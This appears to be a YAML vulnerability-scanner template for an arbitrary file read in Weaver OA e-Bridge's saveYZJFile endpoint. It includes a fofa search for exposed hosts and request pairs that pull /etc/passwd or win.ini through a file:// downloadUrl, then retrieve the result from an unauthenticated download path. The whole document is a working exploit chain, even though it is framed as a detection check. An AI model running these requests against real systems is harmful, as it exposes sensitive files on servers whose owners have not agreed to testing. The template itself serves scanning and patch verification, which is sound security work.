id: weaver-ebridge-saveyzjfile-fileread

info:
  name: 泛微OA E-Bridge saveYZJFile 任意文件读取
  author: mvhz81
  severity: high
  verified: true
  description: |-
    泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
    fofa: title="泛微云桥e-Bridge"
  tags: e-bridge,file-read
  created: 2023/06/23

rules:
  r0:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      p:
        - /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc//passwd&fileExt=txt
        - /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.headers["content-type"].icontains("json") &&
      response.body.bcontains(b'id') &&
      response.body.bcontains(b'filepath')
    output:
      search: '"\\\"id\\\"\\:\\\"(?P<var>.+?)\\\"\\,".bsubmatch(response.body)'
      var: search["var"]

  r1:
    request:
      method: GET
      path: /file/fileNoLogin/{{var}}
    expression: |
      response.status == 200 && 
      (
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body) ||
      response.body.bcontains(b"for 16-bit app support")
      )
expression: r0() && r1()
